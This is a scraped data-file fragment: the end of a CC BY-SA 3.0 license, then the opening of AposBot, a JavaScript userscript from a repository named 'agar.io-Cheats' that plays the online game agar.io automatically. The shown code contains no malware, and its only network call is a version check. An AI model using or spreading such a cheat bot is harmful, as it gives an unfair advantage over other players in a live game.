COPYRIGHT LAW IS PROHIBITED.  BY EXERCISING ANY RIGHTS TO THE WORK PROVIDED HERE, YOU ACCEPT AND AGREE TO BE BOUND BY THE TERMS OF THIS LICENSE. TO THE EXTENT THIS LICENSE MAY BE CONSIDERED TO BE A CONTRACT, THE LICENSOR GRANTS YOU THE RIGHTS CONTAINED HERE IN CONSIDERATION OF YOUR ACCEPTANCE OF SUCH TERMS AND CONDITIONS.  1. Definitions  ""Collective Work"" means a work, such as a periodical issue, anthology or encyclopedia, in which the Work in its entirety in unmodified form, along with one or more other contributions, constituting separate and independent works in themselves, are assembled into a collective whole. A work that constitutes a Collective Work will not be considered a Derivative Work (as defined below) for the purposes of this License. ""Creative Commons Compatible License"" means a license that is listed at http://creativecommons.org/compatiblelicenses that has been approved by Creative Commons as being essentially equivalent to this License, including, at a minimum, because that license: (i) contains terms that have the same purpose, meaning and effect as the License Elements of this License; and, (ii) explicitly permits the relicensing of derivatives of works made available under that license under this License or either a Creative Commons unported license or a Creative Commons jurisdiction license with the same License Elements as this License. ""Derivative Work"" means a work based upon the Work or upon the Work and other pre-existing works, such as a translation, musical arrangement, dramatization, fictionalization, motion picture version, sound recording, art reproduction, abridgment, condensation, or any other form in which the Work may be recast, transformed, or adapted, except that a work that constitutes a Collective Work will not be considered a Derivative Work for the purpose of this License. For the avoidance of doubt, where the Work is a musical composition or sound recording, the synchronization of the Work in timed-relation with a moving image (""synching"") will be considered a Derivative Work for the purpose of this License. ""License Elements"" means the following high-level license attributes as selected by Licensor and indicated in the title of this License: Attribution, ShareAlike. ""Licensor"" means the individual, individuals, entity or entities that offers the Work under the terms of this License. ""Original Author"" means the individual, individuals, entity or entities who created the Work. ""Work"" means the copyrightable work of authorship offered under the terms of this License. ""You"" means an individual or entity exercising rights under this License who has not previously violated the terms of this License with respect to the Work, or who has received express permission from the Licensor to exercise rights under this License despite a previous violation. 2. Fair Use Rights. Nothing in this license is intended to reduce, limit, or restrict any rights arising from fair use, first sale or other limitations on the exclusive rights of the copyright owner under copyright law or other applicable laws.  3. License Grant. Subject to the terms and conditions of this License, Licensor hereby grants You a worldwide, royalty-free, non-exclusive, perpetual (for the duration of the applicable copyright) license to exercise the rights in the Work as stated below:  to reproduce the Work, to incorporate the Work into one or more Collective Works, and to reproduce the Work as incorporated in the Collective Works; to create and reproduce Derivative Works provided that any such Derivative Work, including any translation in any medium, takes reasonable steps to clearly label, demarcate or otherwise identify that changes were made to the original Work. For example, a translation could be marked ""The original work was translated from English to Spanish,"" or a modification could indicate ""The original work has been modified.""; to distribute copies or phonorecords of, display publicly, perform publicly, and perform publicly by means of a digital audio transmission the Work including as incorporated in Collective Works; to distribute copies or phonorecords of, display publicly, perform publicly, and perform publicly by means of a digital audio transmission Derivative Works. For the avoidance of doubt, where the Work is a musical composition:  Performance Royalties Under Blanket Licenses. Licensor waives the exclusive right to collect, whether individually or, in the event that Licensor is a member of a performance rights society (e.g. ASCAP, BMI, SESAC), via that society, royalties for the public performance or public digital performance (e.g. webcast) of the Work. Mechanical Rights and Statutory Royalties. Licensor waives the exclusive right to collect, whether individually or via a music rights agency or designated agent (e.g. Harry Fox Agency), royalties for any phonorecord You create from the Work (""cover version"") and distribute, subject to the compulsory license created by 17 USC Section 115 of the US Copyright Act (or the equivalent in other jurisdictions). Webcasting Rights and Statutory Royalties. For the avoidance of doubt, where the Work is a sound recording, Licensor waives the exclusive right to collect, whether individually or via a performance-rights society (e.g. SoundExchange), royalties for the public digital performance (e.g. webcast) of the Work, subject to the compulsory license created by 17 USC Section 114 of the US Copyright Act (or the equivalent in other jurisdictions). The above rights may be exercised in all media and formats whether now known or hereafter devised. The above rights include the right to make such modifications as are technically necessary to exercise the rights in other media and formats. All rights not expressly granted by Licensor are hereby reserved.  4. Restrictions. The license granted in Section 3 above is expressly made subject to and limited by the following restrictions:  You may distribute, publicly display, publicly perform, or publicly digitally perform the Work only under the terms of this License, and You must include a copy of, or the Uniform Resource Identifier for, this License with every copy or phonorecord of the Work You distribute, publicly display, publicly perform, or publicly digitally perform. You may not offer or impose any terms on the Work that restrict the terms of this License or the ability of a recipient of the Work to exercise of the rights granted to that recipient under the terms of the License. You may not sublicense the Work. You must keep intact all notices that refer to this License and to the disclaimer of warranties. When You distribute, publicly display, publicly perform, or publicly digitally perform the Work, You may not impose any technological measures on the Work that restrict the ability of a recipient of the Work from You to exercise of the rights granted to that recipient under the terms of the License. This Section 4(a) applies to the Work as incorporated in a Collective Work, but this does not require the Collective Work apart from the Work itself to be made subject to the terms of this License. If You create a Collective Work, upon notice from any Licensor You must, to the extent practicable, remove from the Collective Work any credit as required by Section 4(c), as requested. If You create a Derivative Work, upon notice from any Licensor You must, to the extent practicable, remove from the Derivative Work any credit as required by Section 4(c), as requested. You may distribute, publicly display, publicly perform, or publicly digitally perform a Derivative Work only under: (i) the terms of this License; (ii) a later version of this License with the same License Elements as this License; (iii) either the Creative Commons (Unported) license or a Creative Commons jurisdiction license (either this or a later license version) that contains the same License Elements as this License (e.g. Attribution-ShareAlike 3.0 (Unported)); (iv) a Creative Commons Compatible License. If you license the Derivative Work under one of the licenses mentioned in (iv), you must comply with the terms of that license. If you license the Derivative Work under the terms of any of the licenses mentioned in (i), (ii) or (iii) (the ""Applicable License""), you must comply with the terms of the Applicable License generally and with the following provisions: (I) You must include a copy of, or the Uniform Resource Identifier for, the Applicable License with every copy or phonorecord of each Derivative Work You distribute, publicly display, publicly perform, or publicly digitally perform; (II) You may not offer or impose any terms on the Derivative Works that restrict the terms of the Applicable License or the ability of a recipient of the Work to exercise the rights granted to that recipient under the terms of the Applicable License; (III) You must keep intact all notices that refer to the Applicable License and to the disclaimer of warranties; and, (IV) when You distribute, publicly display, publicly perform, or publicly digitally perform the Work, You may not impose any technological measures on the Derivative Work that restrict the ability of a recipient of the Derivative Work from You to exercise the rights granted to that recipient under the terms of the Applicable License. This Section 4(b) applies to the Derivative Work as incorporated in a Collective Work, but this does not require the Collective Work apart from the Derivative Work itself to be made subject to the terms of the Applicable License. If You distribute, publicly display, publicly perform, or publicly digitally perform the Work (as defined in Section 1 above) or any Derivative Works (as defined in Section 1 above) or Collective Works (as defined in Section 1 above), You must, unless a request has been made pursuant to Section 4(a), keep intact all copyright notices for the Work and provide, reasonable to the medium or means You are utilizing: (i) the name of the Original Author (or pseudonym, if applicable) if supplied, and/or (ii) if the Original Author and/or Licensor designate another party or parties (e.g. a sponsor institute, publishing entity, journal) for attribution (""Attribution Parties"") in Licensor\'s copyright notice, terms of service or by other reasonable means, the name of such party or parties; the title of the Work if supplied; to the extent reasonably practicable, the Uniform Resource Identifier, if any, that Licensor specifies to be associated with the Work, unless such URI does not refer to the copyright notice or licensing information for the Work; and, consistent with Section 3(b) in the case of a Derivative Work, a credit identifying the use of the Work in the Derivative Work (e.g., ""French translation of the Work by Original Author,"" or ""Screenplay based on original Work by Original Author""). The credit required by this Section 4(c) may be implemented in any reasonable manner; provided, however, that in the case of a Derivative Work or Collective Work, at a minimum such credit will appear, if a credit for all contributing authors of the Derivative Work or Collective Work appears, then as part of these credits and in a manner at least as prominent as the credits for the other contributing authors. For the avoidance of doubt, You may only use the credit required by this Section for the purpose of attribution in the manner set out above and, by exercising Your rights under this License, You may not implicitly or explicitly assert or imply any connection with, sponsorship or endorsement by the Original Author, Licensor and/or Attribution Parties, as appropriate, of You or Your use of the Work, without the separate, express prior written permission of the Original Author, Licensor and/or Attribution Parties. 5. Representations, Warranties and Disclaimer  UNLESS OTHERWISE MUTUALLY AGREED TO BY THE PARTIES IN WRITING, LICENSOR OFFERS THE WORK AS-IS AND ONLY TO THE EXTENT OF ANY RIGHTS HELD IN THE LICENSED WORK BY THE LICENSOR. THE LICENSOR MAKES NO REPRESENTATIONS OR WARRANTIES OF ANY KIND CONCERNING THE WORK, EXPRESS, IMPLIED, STATUTORY OR OTHERWISE, INCLUDING, WITHOUT LIMITATION, WARRANTIES OF TITLE, MARKETABILITY, MERCHANTIBILITY, FITNESS FOR A PARTICULAR PURPOSE, NONINFRINGEMENT, OR THE ABSENCE OF LATENT OR OTHER DEFECTS, ACCURACY, OR THE PRESENCE OF ABSENCE OF ERRORS, WHETHER OR NOT DISCOVERABLE. SOME JURISDICTIONS DO NOT ALLOW THE EXCLUSION OF IMPLIED WARRANTIES, SO SUCH EXCLUSION MAY NOT APPLY TO YOU.  6. Limitation on Liability. EXCEPT TO THE EXTENT REQUIRED BY APPLICABLE LAW, IN NO EVENT WILL LICENSOR BE LIABLE TO YOU ON ANY LEGAL THEORY FOR ANY SPECIAL, INCIDENTAL, CONSEQUENTIAL, PUNITIVE OR EXEMPLARY DAMAGES ARISING OUT OF THIS LICENSE OR THE USE OF THE WORK, EVEN IF LICENSOR HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.  7. Termination  This License and the rights granted hereunder will terminate automatically upon any breach by You of the terms of this License. Individuals or entities who have received Derivative Works or Collective Works from You under this License, however, will not have their licenses terminated provided such individuals or entities remain in full compliance with those licenses. Sections 1, 2, 5, 6, 7, and 8 will survive any termination of this License. Subject to the above terms and conditions, the license granted here is perpetual (for the duration of the applicable copyright in the Work). Notwithstanding the above, Licensor reserves the right to release the Work under different license terms or to stop distributing the Work at any time; provided, however that any such election will not serve to withdraw this License (or any other license that has been, or is required to be, granted under the terms of this License), and this License will continue in full force and effect unless terminated as stated above. 8. Miscellaneous  Each time You distribute or publicly digitally perform the Work (as defined in Section 1 above) or a Collective Work (as defined in Section 1 above), the Licensor offers to the recipient a license to the Work on the same terms and conditions as the license granted to You under this License. Each time You distribute or publicly digitally perform a Derivative Work, Licensor offers to the recipient a license to the original Work on the same terms and conditions as the license granted to You under this License. If any provision of this License is invalid or unenforceable under applicable law, it shall not affect the validity or enforceability of the remainder of the terms of this License, and without further action by the parties to this agreement, such provision shall be reformed to the minimum extent necessary to make such provision valid and enforceable. No term or provision of this License shall be deemed waived and no breach consented to unless such waiver or consent shall be in writing and signed by the party to be charged with such waiver or consent. This License constitutes the entire agreement between the parties with respect to the Work licensed here. There are no understandings, agreements or representations with respect to the Work not specified here. Licensor shall not be bound by any additional provisions that may appear in any communication from You. This License may not be modified without the mutual written agreement of the Licensor and Yo","usc-kt-order,knights-templar",2
0,https://github.com/githubhack/agar.io-Cheats.git,"/*The MIT License (MIT) Copyright (c) 2015 Apostolique Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.*/  // ==UserScript== // @name        AposBot // @namespace   AposBot // @include     http://agar.io/* // @version     3.568 // @grant       none // @author      http://www.twitch.tv/apostolique // ==/UserScript==  var aposBotVersion = 3.568;  //TODO: Team mode //      Detect when people are merging //      Split to catch smaller targets //      Angle based cluster code //      Better wall code //      In team mode, make allies be obstacles.  Number.prototype.mod = function(n) {     return ((this % n) + n) % n; };  Array.prototype.peek = function() {     return this[this.length - 1]; };  var sha = ""efde0488cc2cc176db48dd23b28a20b90314352b""; function getLatestCommit() {     window.jQuery.ajax({             url: ""https://api.github.com/repos/apostolique/Agar.io-bot/git/refs/heads/master"",             cache: false,             dataType: ""jsonp""         }).done(function(data) {             console.dir(data[""data""]);             console.log(""hmm: "" + data[""data""][""object""][""sha""]);             sha = data[""data""][""object""][""sha""];              function update(prefix, name, url) {                 window.jQuery(document.body).prepend(""<div id=\'"" + prefix + ""Dialog\' style=\'position: absolute; left: 0px; right: 0px; top: 0px; bottom: 0px; z-index: 100; display: none;\'>"");                 window.jQuery(\'#\' + prefix + \'Dialog\').append(""<div id=\'"" + prefix + ""Message\' style=\'width: 350px; background-color: #FFFFFF; margin: 100px auto; border-radius: 15px; padding: 5px 15px 5px 15px;\'>"");                 window.jQuery(\'#\' + prefix + \'Message\').append(""<h2>UPDATE TIME!!!</h2>"");                 window.jQuery(\'#\' + prefix + \'Message\').append(""<p>Grab the update for: <a id=\'"" + prefix + ""Link\' href=\'"" + url + ""\' target=\\""_blank\\"">"" + name + ""</a></p>"");                 window.jQuery(\'#\' + prefix + \'Link\').on(\'click\', function() {                     window.jQuery(""#"" + prefix + ""Dialog"").hide();                     window.jQuery(""#"" + prefix + ""Dialog"").remove();                 });                 window.jQuery(""#"" + prefix + ""Dialog"").show();             }              $.get(\'https://raw.githubusercontent.com/Apostolique/Agar.io-bot/master/bot.user.js?\' + Math.floor((Math.random() * 1000000) + 1), function(data) {                 var latestVersion = data.replace(/(\\r\\n|\\n|\\r)/gm,"""");                 latestVersion = latestVersion.substring(latestVersion.indexOf(""// @version"")+11,latestVersion.indexOf(""// @grant""));                  latestVersion = parseFloat(latestVersion + 0.0000);                 var myVersion = parseFloat(aposBotVersion + 0.0000);                                   if(latestVersion > myVersion)                 {                     update(""aposBot"", ""bot.user.js"", ""https://github.com/Apostolique/Agar.io-bot/blob/"" + sha + ""/bot.user.js/"");                 }                 console.log(\'Current bot.user.js Version: \' + myVersion + "" on Github: "" + latestVersion);             });          }).fail(function() {}); } getLatestCommit();  console.log(""Running Apos Bot!"");  var f = window; var g = window.jQuery;  var aposBot = aposBot || {}; aposBot.name = ""AposBot "" + aposBotVersion; aposBot.mainLoop = function() {}; aposBot.utility = {};  var u = aposBot.utility;  u.splitDistance = 710; console.log(""Apos Bot!"");  if (f.botList == null) {     f.botList = [];     g(\'#locationUnknown\').append(g(\'<select id=""bList"" class=""form-control"" onchange=""setBotIndex($(this).val());"" />\'));     g(\'#locationUnknown\').addClass(\'form-group\'); }  for (var i = f.botList.length - 1; i >= 0; i--) {     if (f.botList[i][0] == ""Human"") {         f.botList.splice(i, 1);     } }   //Given an angle value that was gotten from valueAndleBased(), //returns a new value that scales it appropriately. u.paraAngleValue = function(angleValue, range) {     return (15 / (range[1])) * (angleValue * angleValue) - (range[1] / 6); };  u.valueAngleBased = function(angle, range) {     var leftValue = (angle - range[0]).mod(360);     var rightValue = (u.rangeToAngle(range) - angle).mod(360);      var bestValue = Math.min(leftValue, rightValue);      if (bestValue <= range[1]) {         return u.paraAngleValue(bestValue, range);     }     return -1; };  u.computeDistance = function(x1, y1, x2, y2) {     var xdis = x1 - x2; // <--- FAKE AmS OF COURSE!     var ydis = y1 - y2;     var distance = Math.sqrt(xdis * xdis + ydis * ydis);      return distance; };  u.computeDistanceFromCircleEdge = function(x1, y1, x2, y2, s2) {     var tempD = u.computeDistance(x1, y1, x2, y2);      var offsetX = 0;     var offsetY = 0;      var ratioX = tempD / (x1 - x2);     var ratioY = tempD / (y1 - y2);      offsetX = x1 - (s2 / ratioX);     offsetY = y1 - (s2 / ratioY);      u.drawPoint(offsetX, offsetY, 5, """");      return u.computeDistance(x2, y2, offsetX, offsetY); };  u.compareSize = function(player1, player2, ratio) {     if (player1.size * player1.size * ratio < player2.size * player2.size) {         return true;     }     return false; };  u.canSplit = function(player1, player2) {     return u.compareSize(player1, player2, 2.66) && !u.compareSize(player1, player2, 7); };  u.isItMe = function(player, cell) {     if (u.getMode() == "":teams"") {         var currentColor = player[0].color;         var currentRed = currentColor.substring(1,3);         var currentGreen = currentColor.substring(3,5);         var currentBlue = currentColor.substring(5,7);                  var currentTeam = u.getTeam(currentRed, currentGreen, currentBlue);          var cellColor = cell.color;          var cellRed = cellColor.substring(1,3);         var cellGreen = cellColor.substring(3,5);         var cellBlue = cellColor.substring(5,7);          var cellTeam = getTeam(cellRed, cellGreen, cellBlue);          if (currentTeam == cellTeam && !cell.isVirus()) {             return true;         }          //console.log(""COLOR: "" + color);      } else {         for (var i = 0; i < player.length; i++) {             if (cell.id == player[i].id) {                 return true;             }         }     }     return false; };  u.getTeam = function(red, green, blue) {     if (red == ""ff"") {         return 0;     } else if (green == ""ff"") {         return 1;     }     return 2; };  u.isFood = function(blob, cell) {     if (!cell.isVirus() && u.compareSize(cell, blob, 1.33) || (cell.size <= 11)) {         return true;     }     return false; } ; u.isThreat = function(blob, cell) {     if (!cell.isVirus() && u.isFood(cell, blob)) {         return true;     }     return false;     /*if (!cell.isVirus() && compareSize(blob, cell, 1.33)) {         return true;     }     return false;*/ };  u.isVirus = function(blob, cell) {     if (cell.isVirus() && u.compareSize(cell, blob, 1.30)) {         return true;     } else if (cell.isVirus() && cell.color.substring(3,5).toLowerCase() != ""ff"") {         return true;     }     return false; };  u.isSplitTarget = function(blob, cell) {     /*if (u.canSplit(cell, blob)) {         return true;     }*/     return false; };  u.getTimeToRemerge = function(mass){     return ((mass*0.02) + 30); };  u.separateListBasedOnFunction = function(listToUse, blob) {     var foodElementList = [];     var threatList = [];     var virusList = [];     var splitTargetList = [];      var player = u.getPlayer();      Object.keys(listToUse).forEach(function(element, index) {         var isMe = u.isItMe(player, listToUse[element]);          if (!isMe) {             if (u.isFood(blob, listToUse[element])/* && listToUse[element].isNotMoving()*/) {                 //IT\'S FOOD!                 foodElementList.push(listToUse[element]);                  if (u.isSplitTarget(blob, listToUse[element])) {                     u.drawCircle(listToUse[element].x, listToUse[element].y, listToUse[element].size + 50, 7);                     u.splitTargetList.push(listToUse[element]);                 }             } else if (u.isThreat(blob, listToUse[element])) {                 //IT\'S DANGER!                 threatList.push(listToUse[element]);             } else if (u.isVirus(blob, listToUse[element])) {                 //IT\'S VIRUS!                 virusList.push(listToUse[element]);             }         }/*else if(isMe && (getBlobCount(getPlayer()) > 0)){             //Attempt to make the other cell follow the mother one             foodElementList.push(listToUse[element]);         }*/     });      foodList = [];     for (var i = 0; i < foodElementList.length; i++) {         foodList.push([foodElementList[i].x, foodElementList[i].y, foodElementList[i].size]);     }      return [foodList, threatList, virusList, splitTargetList]; };  u.getAll = function(blob) {     var dotList = [];     var player = u.getPlayer();     var interNodes = u.getMemoryCells();      dotList = u.separateListBasedOnFunction(interNodes, blob);      return dotList; };  u.clusterFood = function(foodList, blobSize) {     var clusters = [];     var addedCluster = false;      //1: x     //2: y     //3: size or value     //4: Angle, not set here.      for (var i = 0; i < foodList.length; i++) {         for (var j = 0; j < clusters.length; j++) {             if (u.computeDistance(foodList[i][0], foodList[i][1], clusters[j][0], clusters[j][1]) < blobSize * 1.5) {                 clusters[j][0] = (foodList[i][0] + clusters[j][0]) / 2;                 clusters[j][1] = (foodList[i][1] + clusters[j][1]) / 2;                 clusters[j][2] += foodList[i][2];                 addedCluster = true;                 break;             }         }         if (!addedCluster) {             clusters.push([foodList[i][0], foodList[i][1], foodList[i][2], 0]);         }         addedCluster = false;     }     return clusters; };  u.getAngle = function(x1, y1, x2, y2) {     //Handle vertical and horizontal lines.      if (x1 == x2) {         if (y1 < y2) {             return 271;             //return 89;         } else {             return 89;         }     }      return (Math.round(Math.atan2(-(y1 - y2), -(x1 - x2)) / Math.PI * 180 + 180)); };  u.slope = function(x1, y1, x2, y2) {     var m = (y1 - y2) / (x1 - x2);      return m; };  u.slopeFromAngle = function(degree) {     if (degree == 270) {         degree = 271;     } else if (degree == 90) {         degree = 91;     }     return Math.tan((degree - 180) / 180 * Math.PI); };  //Given two points on a line, finds the slope of a perpendicular line crossing it. u.inverseSlope = function(x1, y1, x2, y2) {     var m = slope(x1, y1, x2, y2);     return (-1) / m; };  //Given a slope and an offset, returns two points on that line. u.pointsOnLine = function(slope, useX, useY, distance) {     var b = useY - slope * useX;     var r = Math.sqrt(1 + slope * slope);      var newX1 = (useX + (distance / r));     var newY1 = (useY + ((distance * slope) / r));     var newX2 = (useX + ((-distance) / r));     var newY2 = (useY + (((-distance) * slope) / r));      return [         [newX1, newY1],         [newX2, newY2]     ]; };  u.followAngle = function(angle, useX, useY, distance) {     var slope = u.slopeFromAngle(angle);     var coords = u.pointsOnLine(slope, useX, useY, distance);      var side = (angle - 90).mod(360);     if (side < 180) {         return coords[1];     } else {         return coords[0];     } };  //Using a line formed from point a to b, tells if point c is on S side of that line. u.isSideLine = function(a, b, c) {     if ((b[0] - a[0]) * (c[1] - a[1]) - (b[1] - a[1]) * (c[0] - a[0]) > 0) {         return true;     }     return false; };  //angle range2 is within angle range2 //an Angle is a point and a distance between an other point [5, 40] u.angleRangeIsWithin = function(range1, range2) {     if (range2[0] == (range2[0] + range2[1]).mod(360)) {         return true;     }     //console.log(""r1: "" + range1[0] + "", "" + range1[1] + "" ... r2: "" + range2[0] + "", "" + range2[1]);      var distanceFrom0 = (range1[0] - range2[0]).mod(360);     var distanceFrom1 = (range1[1] - range2[0]).mod(360);      if (distanceFrom0 < range2[1] && distanceFrom1 < range2[1] && distanceFrom0 < distanceFrom1) {         return true;     }     return false; };  u.angleRangeIsWithinInverted = function(range1, range2) {     var distanceFrom0 = (range1[0] - range2[0]).mod(360);     var distanceFrom1 = (range1[1] - range2[0]).mod(360);      if (distanceFrom0 < range2[1] && distanceFrom1 < range2[1] && distanceFrom0 > distanceFrom1) {         return true;     }     return false; };  u.angleIsWithin = function(angle, range) {     var diff = (u.rangeToAngle(range) - angle).mod(360);     if (diff >= 0 && diff <= range[1]) {         return true;     }     return false; };  u.rangeToAngle = function(range) {     return (range[0] + range[1]).mod(360); };  u.anglePair = function(range) {     return (range[0] + "", "" + u.rangeToAngle(range) + "" range: "" + range[1]); };  u.computeAngleRanges = function(blob1, blob2) {     var mainAngle = u.getAngle(blob1.x, blob1.y, blob2.x, blob2.y);     var leftAngle = (mainAngle - 90).mod(360);     var rightAngle = (mainAngle + 90).mod(360);      var blob1Left = u.followAngle(leftAngle, blob1.x, blob1.y, blob1.size);     var blob1Right = u.followAngle(rightAngle, blob1.x, blob1.y, blob1.size);      var blob2Left = u.followAngle(rightAngle, blob2.x, blob2.y, blob2.size);     var blob2Right = u.followAngle(leftAngle, blob2.x, blob2.y, blob2.size);      var blob1AngleLeft = u.getAngle(blob2.x, blob2.y, blob1Left[0], blob1Left[1]);     var blob1AngleRight = u.getAngle(blob2.x, blob2.y, blob1Right[0], blob1Right[1]);      var blob2AngleLeft = u.getAngle(blob1.x, blob1.y, blob2Left[0], blob2Left[1]);     var blob2AngleRight = u.getAngle(blob1.x, blob1.y, blob2Right[0], blob2Right[1]);      var blob1Range = (blob1AngleRight - blob1AngleLeft).mod(360);     var blob2Range = (blob2AngleRight - blob2AngleLeft).mod(360);      var tempLine = u.followAngle(blob2AngleLeft, blob2Left[0], blob2Left[1], 400);     //drawLine(blob2Left[0], blob2Left[1], tempLine[0], tempLine[1], 0);      if ((blob1Range / blob2Range) > 1) {         drawPoint(blob1Left[0], blob1Left[1], 3, """");         drawPoint(blob1Right[0], blob1Right[1], 3, """");         drawPoint(blob1.x, blob1.y, 3, """" + blob1Range + "", "" + blob2Range + "" R: "" + (Math.round((blob1Range / blob2Range) * 1000) / 1000));     }      //drawPoint(blob2.x, blob2.y, 3, """" + blob1Range); };  u.debugAngle = function(angle, text) {     var player = u.getPlayer();     var line1 = u.followAngle(angle, player[0].x, player[0].y, 300);     u.drawLine(player[0].x, player[0].y, line1[0], line1[1], 5);     u.drawPoint(line1[0], line1[1], 5, """" + text); };  //TODO: Don\'t let this function do the radius math. u.getEdgeLinesFromPoint = function(blob1, blob2, radius) {     var px = blob1.x;     var py = blob1.y;      var cx = blob2.x;     var cy = blob2.y;      //var radius = blob2.size;      /*if (blob2.isVirus()) {         radius = blob1.size;     } else if(canSplit(blob1, blob2)) {         radius += splitDistance;     } else {         radius += blob1.size * 2;     }*/      var shouldInvert = false;      var tempRadius = u.computeDistance(px, py, cx, cy);     if (tempRadius <= radius) {         radius = tempRadius - 5;         shouldInvert = true;     }      var dx = cx - px;     var dy = cy - py;     var dd = Math.sqrt(dx * dx + dy * dy);     var a = Math.asin(radius / dd);     var b = Math.atan2(dy, dx);      var t = b - a;     var ta = {         x: radius * Math.sin(t),         y: radius * -Math.cos(t)     };      t = b + a;     var tb = {         x: radius * -Math.sin(t),         y: radius * Math.cos(t)     };      var angleLeft = u.getAngle(cx + ta.x, cy + ta.y, px, py);     var angleRight = u.getAngle(cx + tb.x, cy + tb.y, px, py);     var angleDistance = (angleRight - angleLeft).mod(360);      /*if (shouldInvert) {         var temp = angleLeft;         angleLeft = (angleRight + 180).mod(360);         angleRight = (temp + 180).mod(360);         angleDistance = (angleRight - angleLeft).mod(360);     }*/      return [angleLeft, angleDistance, [cx + tb.x, cy + tb.y],         [cx + ta.x, cy + ta.y]     ]; };  u.invertAngle = function(range) {     var angle1 = u.rangeToAngle(badAngles[i]);     var angle2 = (badAngles[i][0] - angle1).mod(360);     return [angle1, angle2]; };  u.addWall = function(listToUse, blob) {     //var mapSizeX = Math.abs(f.getMapStartX - f.getMapEndX);     //var mapSizeY = Math.abs(f.getMapStartY - f.getMapEndY);     //var distanceFromWallX = mapSizeX/3;     //var distanceFromWallY = mapSizeY/3;     var distanceFromWallY = 2000;     var distanceFromWallX = 2000;     if (blob.x < f.getMapStartX() + distanceFromWallX) {         //LEFT         //console.log(""Left"");         listToUse.push([             [90, true],             [270, false], u.computeDistance(getMapStartX(), blob.y, blob.x, blob.y)         ]);         var lineLeft = u.followAngle(90, blob.x, blob.y, 190 + blob.size);         var lineRight = u.followAngle(270, blob.x, blob.y, 190 + blob.size);         u.drawLine(blob.x, blob.y, lineLeft[0], lineLeft[1], 5);         u.drawLine(blob.x, blob.y, lineRight[0], lineRight[1], 5);         u.drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob.x, blob.y, 5);     }     if (blob.y < getMapStartY() + distanceFromWallY) {         //TOP         //console.log(""TOP"");         listToUse.push([             [180, true],             [0, false], u.computeDistance(blob.x, getMapStartY, blob.x, blob.y)         ]);         var lineLeft = u.followAngle(180, blob.x, blob.y, 190 + blob.size);         var lineRight = u.followAngle(360, blob.x, blob.y, 190 + blob.size);         u.drawLine(blob.x, blob.y, lineLeft[0], lineLeft[1], 5);         u.drawLine(blob.x, blob.y, lineRight[0], lineRight[1], 5);         u.drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob.x, blob.y, 5);     }     if (blob.x > getMapEndX() - distanceFromWallX) {         //RIGHT         //console.log(""RIGHT"");         listToUse.push([             [270, true],             [90, false], u.computeDistance(getMapEndX(), blob.y, blob.x, blob.y)         ]);         var lineLeft = u.followAngle(270, blob.x, blob.y, 190 + blob.size);         var lineRight = u.followAngle(90, blob.x, blob.y, 190 + blob.size);         u.drawLine(blob.x, blob.y, lineLeft[0], lineLeft[1], 5);         u.drawLine(blob.x, blob.y, lineRight[0], lineRight[1], 5);         u.drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob.x, blob.y, 5);     }     if (blob.y > getMapEndY() - distanceFromWallY) {         //BOTTOM         //console.log(""BOTTOM"");         listToUse.push([             [0, true],             [180, false], u.computeDistance(blob.x, getMapEndY(), blob.x, blob.y)         ]);         var lineLeft = u.followAngle(0, blob.x, blob.y, 190 + blob.size);         var lineRight = u.followAngle(180, blob.x, blob.y, 190 + blob.size);         u.drawLine(blob.x, blob.y, lineLeft[0], lineLeft[1], 5);         u.drawLine(blob.x, blob.y, lineRight[0], lineRight[1], 5);         u.drawArc(lineLeft[0], lineLeft[1], lineRight[0], lineRight[1], blob.x, blob.y, 5);     }     return listToUse; };  //listToUse contains angles in the form of [angle, boolean]. //boolean is true when the range is starting. False when it\'s ending. //range = [[angle1, true], [angle2, false]]  u.getAngleIndex = function(listToUse, angle) {     if (listToUse.length == 0) {         return 0;     }      for (var i = 0; i < listToUse.length; i++) {         if (angle <= listToUse[i][0]) {             return i;         }     }      return listToUse.length; };  u.addAngle = function(listToUse, range) {     //#1 Find first open element     //#2 Try to add range1 to the list. If it is within other range, don\'t add it, set a boolean.     //#3 Try to add range2 to the list. If it is withing other range, don\'t add it, set a boolean.      //TODO: Only add the new range at the end after the right stuff has been removed.      var newListToUse = listToUse.slice();      var startIndex = 1;      if (newListToUse.length > 0 && !newListToUse[0][1]) {         startIndex = 0;     }      var startMark = u.getAngleIndex(newListToUse, range[0][0]);     var startBool = startMark.mod(2) != startIndex;      var endMark = u.getAngleIndex(newListToUse, range[1][0]);     var endBool = endMark.mod(2) != startIndex;      var removeList = [];      if (startMark != endMark) {         //Note: If there is still an error, this would be it.         var biggerList = 0;         if (endMark == newListToUse.length) {             biggerList = 1;         }          for (var i = startMark; i < startMark + (endMark - startMark).mod(newListToUse.length + biggerList); i++) {             removeList.push((i).mod(newListToUse.length));         }     } else if (startMark < newListToUse.length && endMark < newListToUse.length) {         var startDist = (newListToUse[startMark][0] - range[0][0]).mod(360);         var endDist = (newListToUse[endMark][0] - range[1][0]).mod(360);          if (startDist < endDist) {             for (var i = 0; i < newListToUse.length; i++) {                 removeList.push(i);             }         }     }      removeList.sort(function(a, b){return b-a;});      for (var i = 0; i < removeList.length; i++) {         newListToUse.splice(removeList[i], 1);     }      if (startBool) {         newListToUse.splice(u.getAngleIndex(newListToUse, range[0][0]), 0, range[0]);     }     if (endBool) {         newListToUse.splice(u.getAngleIndex(newListToUse, range[1][0]), 0, range[1]);     }      return newListToUse; };  u.getAngleRange = function(blob1, blob2, index, radius) {     var angleStuff = 